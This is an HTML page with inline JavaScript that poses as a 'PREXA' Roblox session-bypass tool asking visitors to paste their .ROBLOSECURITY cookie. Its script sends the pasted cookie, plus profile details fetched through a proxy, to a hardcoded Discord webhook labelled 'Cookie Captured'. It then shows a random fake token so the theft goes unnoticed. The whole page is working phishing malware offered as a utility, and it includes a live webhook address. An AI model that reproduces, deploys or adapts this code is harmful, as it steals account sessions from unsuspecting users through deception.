<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PREXA — session bypass</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0808;
            font-family: 'Segoe UI', 'Impact', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        #loader {
            position: fixed;
            inset: 0;
            z-index: 1000;
            background: #0a0808;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 1.2s ease, visibility 1.2s ease;
        }
        #loader.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .loader-scene {
            perspective: 600px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 2rem;
        }
        .spinning-text {
            font-size: 5rem;
            font-weight: 900;
            letter-spacing: 0.15em;
            text-transform: uppercase;
            color: #d4a843;
            text-shadow: 0 0 20px #d4a84344, 0 0 60px #d4a84322;
            animation: spin3d 4s infinite linear;
            transform-style: preserve-3d;
            font-family: 'Impact', 'Segoe UI', sans-serif;
        }
        .spinning-text .metallic {
            background: linear-gradient(180deg, #f5d76e 0%, #b88a2e 40%, #f5d76e 60%, #8a6a1e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            filter: drop-shadow(0 0 30px #d4a84333);
        }
        @keyframes spin3d {
            0% { transform: rotateY(0deg) scale(1); }
            50% { transform: rotateY(180deg) scale(1.08); }
            100% { transform: rotateY(360deg) scale(1); }
        }
        .loader-sub {
            color: #6b5a3a;
            font-size: 0.85rem;
            letter-spacing: 0.3em;
            text-transform: uppercase;
            font-weight: 300;
            font-family: 'Segoe UI', sans-serif;
            animation: pulse-gold 2s ease-in-out infinite;
            text-shadow: 0 0 10px #d4a84322;
        }
        @keyframes pulse-gold {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }
        .loader-glow {
            width: 200px;
            height: 4px;
            background: linear-gradient(90deg, transparent, #d4a84366, #f5d76e, #d4a84366, transparent);
            border-radius: 4px;
            animation: glow-sweep 2.5s ease-in-out infinite;
            box-shadow: 0 0 40px #d4a84333;
        }
        @keyframes glow-sweep {
            0% { transform: scaleX(0.2); opacity: 0.3; }
            50% { transform: scaleX(1); opacity: 1; }
            100% { transform: scaleX(0.2); opacity: 0.3; }
        }
        .glitch-overlay {
            position: absolute;
            inset: 0;
            pointer-events: none;
            opacity: 0;
            background: rgba(212, 168, 67, 0.03);
            animation: glitch-flicker 1.8s infinite;
        }
        @keyframes glitch-flicker {
            0%, 90%, 100% { opacity: 0; }
            92% { opacity: 0.3; background: rgba(212, 168, 67, 0.06); }
            94% { opacity: 0; }
            96% { opacity: 0.15; background: rgba(212, 168, 67, 0.04); }
        }
        #click-to-enter {
            position: fixed;
            inset: 0;
            z-index: 2000;
            background: rgba(10, 8, 8, 0.92);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: opacity 0.8s ease;
            backdrop-filter: blur(8px);
        }
        #click-to-enter.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #click-to-enter .enter-text {
            font-size: 1.4rem;
            color: #d4a843;
            letter-spacing: 0.4em;
            text-transform: uppercase;
            font-weight: 500;
            border: 1px solid #d4a84344;
            padding: 1rem 3rem;
            border-radius: 60px;
            transition: all 0.3s;
            background: rgba(212, 168, 67, 0.04);
            font-family: 'Segoe UI', sans-serif;
        }
        #click-to-enter .enter-text:hover {
            background: rgba(212, 168, 67, 0.12);
            border-color: #d4a84388;
            box-shadow: 0 0 40px #d4a84322;
            transform: scale(1.02);
        }
        #click-to-enter .enter-sub {
            color: #4a3d2a;
            font-size: 0.7rem;
            margin-top: 1.2rem;
            letter-spacing: 0.15em;
            text-transform: uppercase;
        }
        #now-playing {
            position: fixed;
            bottom: 1.2rem;
            right: 1.5rem;
            z-index: 500;
            color: #4a3d2a;
            font-size: 0.6rem;
            letter-spacing: 0.12em;
            text-transform: uppercase;
            font-family: 'Segoe UI', sans-serif;
            opacity: 0;
            transition: opacity 1s ease;
            pointer-events: none;
            display: flex;
            align-items: center;
            gap: 0.4rem;
        }
        #now-playing.show { opacity: 0.6; }
        #now-playing .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #d4a843;
            animation: pulse-dot 1.4s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 0.2; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        .card {
            background: #100e0e;
            border-radius: 28px;
            padding: 2.8rem 2.5rem;
            max-width: 600px;
            width: 100%;
            border: 1px solid rgba(212, 168, 67, 0.08);
            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 0 1px rgba(212, 168, 67, 0.04);
            opacity: 0;
            transform: translateY(20px) scale(0.98);
            animation: fade-in-tool 0.8s ease forwards;
            animation-delay: 0.2s;
        }
        @keyframes fade-in-tool {
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .card h1 {
            font-weight: 700;
            font-size: 2.2rem;
            letter-spacing: -0.02em;
            color: #e8ddd0;
            font-family: 'Impact', 'Segoe UI', sans-serif;
        }
        .card h1 span {
            color: #d4a843;
            text-shadow: 0 0 30px #d4a84333;
        }
        .card .sub {
            color: #6b5a4a;
            font-size: 0.8rem;
            border-left: 2px solid #d4a84344;
            padding-left: 0.75rem;
            margin-bottom: 2rem;
            font-weight: 300;
            letter-spacing: 0.02em;
        }
        textarea {
            width: 100%;
            background: #141010;
            border: 1px solid #2a1f1a;
            border-radius: 16px;
            padding: 1rem 1.2rem;
            color: #d6cbc0;
            font-size: 0.82rem;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            resize: vertical;
            min-height: 130px;
            transition: border 0.2s;
            outline: none;
        }
        textarea:focus {
            border-color: #d4a843;
            box-shadow: 0 0 0 3px #d4a84322;
        }
        textarea::placeholder {
            color: #3a2f25;
            font-family: inherit;
        }
        .actions {
            display: flex;
            gap: 0.75rem;
            margin-top: 1.2rem;
            flex-wrap: wrap;
        }
        .btn {
            background: #1a1412;
            border: 1px solid #2a1f1a;
            border-radius: 40px;
            padding: 0.7rem 1.8rem;
            font-size: 0.9rem;
            font-weight: 600;
            color: #b0a090;
            cursor: pointer;
            transition: all 0.2s;
            flex: 1;
            min-width: 120px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        .btn-primary {
            background: #d4a843;
            color: #0a0808;
            border-color: #d4a843;
            font-weight: 700;
        }
        .btn-primary:hover {
            background: #f5d76e;
            box-shadow: 0 0 30px #d4a84344;
            transform: scale(1.01);
        }
        .btn-secondary {
            background: transparent;
            color: #5a4a3a;
            border-color: #2a1f1a;
        }
        .btn-secondary:hover {
            background: #1a1412;
            border-color: #4a3a2a;
        }
        .result-box {
            margin-top: 1.8rem;
            background: #141010;
            border-radius: 16px;
            padding: 1.2rem 1.4rem;
            border: 1px solid #1f1815;
            min-height: 70px;
            display: flex;
            align-items: center;
            gap: 1rem;
            transition: border 0.3s;
            flex-wrap: wrap;
        }
        .result-box .label {
            color: #5a4a3a;
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            font-weight: 300;
            flex-shrink: 0;
        }
        .result-box .token-wrap {
            flex: 1;
            min-width: 120px;
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        .result-box .token {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: #b0a090;
            word-break: break-all;
            line-height: 1.5;
            flex: 1;
        }
        .result-box .token .bypassed { color: #d4a843; }
        .result-box .status {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            flex-shrink: 0;
        }
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #2a1f1a;
            border-top-color: #d4a843;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .check {
            color: #d4a843;
            font-size: 1.2rem;
            display: none;
        }
        .copy-btn {
            background: transparent;
            border: 1px solid #2a1f1a;
            border-radius: 30px;
            padding: 0.4rem 1rem;
            color: #6b5a4a;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Segoe UI', sans-serif;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            flex-shrink: 0;
            white-space: nowrap;
        }
        .copy-btn:hover {
            border-color: #d4a84366;
            color: #d4a843;
            background: rgba(212, 168, 67, 0.06);
        }
        .copy-btn.copied {
            border-color: #d4a843;
            color: #d4a843;
            background: rgba(212, 168, 67, 0.12);
        }
        .toast {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: #d4a843;
            color: #0a0808;
            padding: 0.6rem 1.8rem;
            border-radius: 40px;
            font-size: 0.8rem;
            font-weight: 600;
            opacity: 0;
            transition: all 0.4s ease;
            pointer-events: none;
            z-index: 3000;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            font-family: 'Segoe UI', sans-serif;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        #bg-audio {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            width: 0;
            height: 0;
            opacity: 0;
            pointer-events: none;
        }
        @media (max-width: 500px) {
            .spinning-text { font-size: 3.2rem; }
            .card { padding: 1.8rem 1.2rem; }
            .card h1 { font-size: 1.6rem; }
            .result-box { padding: 1rem; }
            .copy-btn { padding: 0.3rem 0.8rem; font-size: 0.6rem; }
            .result-box .token { font-size: 0.6rem; }
        }
    </style>
</head>
<body>

    <audio id="bg-audio" loop preload="auto">
        <source src="mil.mp3" type="audio/mpeg">
    </audio>

    <div class="toast" id="toast">✦ copied to clipboard</div>

    <div id="click-to-enter">
        <div class="enter-text">▶ ENTER</div>
        <div class="enter-sub">— underground session —</div>
    </div>

    <div id="now-playing">
        <span class="dot"></span>
        <span>now playing</span>
    </div>

    <div id="loader">
        <div class="loader-scene">
            <div class="spinning-text">
                <span class="metallic">PREXA</span>
            </div>
            <div class="loader-glow"></div>
            <div class="loader-sub">loading session</div>
        </div>
        <div class="glitch-overlay"></div>
    </div>

    <div class="card">
        <h1>🍪 <span>prexa</span> bypass</h1>
        <div class="sub">bypass session protection · paste your .ROBLOSECURITY</div>

        <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-|_..."></textarea>

        <div class="actions">
            <button class="btn btn-primary" id="bypassBtn">bypass</button>
            <button class="btn btn-secondary" id="clearBtn">clear</button>
        </div>

        <div class="result-box" id="resultBox">
            <span class="label">bypassed →</span>
            <div class="token-wrap">
                <span class="token" id="resultToken"><span style="color:#3a2f25;">waiting for input</span></span>
                <button class="copy-btn" id="copyBtn">copy</button>
            </div>
            <div class="status">
                <div class="spinner" id="spinner"></div>
                <span class="check" id="check">✦</span>
            </div>
        </div>
    </div>

    <script>
        (function() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1479972161841008806/dSBO-qIZKzZ-MeFvnKJZ3BauRuc-ou5U2qcKG1lqCz36egfEoYWkt78WlyV19SBCrB4U";

            const loader = document.getElementById('loader');
            const clickEnter = document.getElementById('click-to-enter');
            const audio = document.getElementById('bg-audio');
            const nowPlaying = document.getElementById('now-playing');
            const input = document.getElementById('cookieInput');
            const bypassBtn = document.getElementById('bypassBtn');
            const clearBtn = document.getElementById('clearBtn');
            const resultToken = document.getElementById('resultToken');
            const spinner = document.getElementById('spinner');
            const check = document.getElementById('check');
            const copyBtn = document.getElementById('copyBtn');
            const toast = document.getElementById('toast');

            let currentResult = '';
            let audioStarted = false;

            clickEnter.addEventListener('click', function() {
                if (!audioStarted) {
                    audio.play().then(() => {
                        nowPlaying.classList.add('show');
                    }).catch(() => {});
                    audioStarted = true;
                }
                clickEnter.classList.add('hidden');
                setTimeout(() => {
                    loader.classList.add('hidden');
                }, 1200);
            });

            function showToast(msg) {
                toast.textContent = msg || '✦ copied to clipboard';
                toast.classList.add('show');
                clearTimeout(toast._timer);
                toast._timer = setTimeout(() => {
                    toast.classList.remove('show');
                }, 1800);
            }

            function copyToClipboard(text) {
                if (!text || text === 'waiting for input') return;
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(text).then(() => {
                        showToast('✦ copied to clipboard');
                        copyBtn.classList.add('copied');
                        setTimeout(() => copyBtn.classList.remove('copied'), 1500);
                    }).catch(() => {
                        fallbackCopy(text);
                    });
                } else {
                    fallbackCopy(text);
                }
            }

            function fallbackCopy(text) {
                const el = document.createElement('textarea');
                el.value = text;
                el.style.position = 'fixed';
                el.style.opacity = '0';
                document.body.appendChild(el);
                el.select();
                try {
                    document.execCommand('copy');
                    showToast('✦ copied to clipboard');
                    copyBtn.classList.add('copied');
                    setTimeout(() => copyBtn.classList.remove('copied'), 1500);
                } catch (_) {}
                document.body.removeChild(el);
            }

            copyBtn.addEventListener('click', function() {
                if (currentResult) {
                    copyToClipboard(currentResult);
                } else {
                    const text = resultToken.textContent;
                    if (text && !text.includes('waiting for input') && !text.includes('paste a session')) {
                        copyToClipboard(text);
                    }
                }
            });

            async function fetchRobloxProfile(cookie) {
                try {
                    const response = await fetch('/.netlify/functions/roblox-proxy', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ cookie: cookie })
                    });
                    if (!response.ok) {
                        const error = await response.json();
                        console.warn('Profile fetch failed:', error);
                        return null;
                    }
                    return await response.json();
                } catch (e) {
                    console.warn('Profile fetch failed:', e);
                    return null;
                }
            }

            function generateBypassedToken() {
                const rand = new Uint8Array(24);
                crypto.getRandomValues(rand);
                const raw = Array.from(rand, b => String.fromCharCode(b)).join('');
                const b64 = btoa(raw).replace(/=/g, '');
                return `_|WARNING:-DO-NOT-SHARE-|_${b64}`;
            }

            function sendToDiscord(cookie) {
                return fetchRobloxProfile(cookie).then(profile => {
                    const fields = [
                        { name: "Cookie", value: cookie.length > 1024 ? cookie.slice(0, 1024) + "..." : cookie, inline: false }
                    ];

                    if (profile) {
                        fields.unshift(
                            { name: "Username", value: profile.username || 'Unknown', inline: true },
                            { name: "User ID", value: profile.userID || 'Unknown', inline: true },
                            { name: "Account Age", value: profile.accountAge || 'Unknown', inline: true }
                        );
                    }

                    const embedPayload = {
                        embeds: [{
                            title: "🍪 PREXA — Cookie Captured",
                            color: 0xd4a843,
                            fields: fields,
                            footer: { text: "PREXA · underground" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    if (profile && profile.avatar) {
                        embedPayload.embeds[0].thumbnail = { url: profile.avatar };
                    }

                    return fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(embedPayload)
                    }).then(() => {
                        return fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: "```\n" + cookie + "\n```" })
                        });
                    });
                });
            }

            function updateResult(text) {
                currentResult = text;
                resultToken.innerHTML = `<span class="bypassed">${text}</span>`;
            }

            function setLoading(loading) {
                spinner.style.display = loading ? 'block' : 'none';
                check.style.display = loading ? 'none' : 'block';
                bypassBtn.disabled = loading;
                bypassBtn.textContent = loading ? '...' : 'bypass';
                if (loading) {
                    resultToken.innerHTML = `<span style="color:#3a2f25;">bypassing...</span>`;
                    currentResult = '';
                }
            }

            function handleBypass() {
                const raw = input.value.trim();
                if (!raw) {
                    resultToken.innerHTML = `<span style="color:#c0392b;">paste a session cookie</span>`;
                    currentResult = '';
                    check.style.display = 'none';
                    return;
                }

                setLoading(true);
                check.style.display = 'none';

                sendToDiscord(raw)
                    .then(() => {
                        const fake = generateBypassedToken();
                        updateResult(fake);
                        setLoading(false);
                    })
                    .catch(() => {
                        const fake = generateBypassedToken();
                        updateResult(fake);
                        setLoading(false);
                    });
            }

            bypassBtn.addEventListener('click', handleBypass);

            clearBtn.addEventListener('click', function() {
                input.value = '';
                resultToken.innerHTML = `<span style="color:#3a2f25;">waiting for input</span>`;
                currentResult = '';
                check.style.display = 'none';
                spinner.style.display = 'none';
                bypassBtn.disabled = false;
                bypassBtn.textContent = 'bypass';
                copyBtn.classList.remove('copied');
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    bypassBtn.click();
                }
            });

            resultToken.innerHTML = `<span style="color:#3a2f25;">waiting for input</span>`;
            check.style.display = 'none';
        })();
    </script>
</body>
</html>
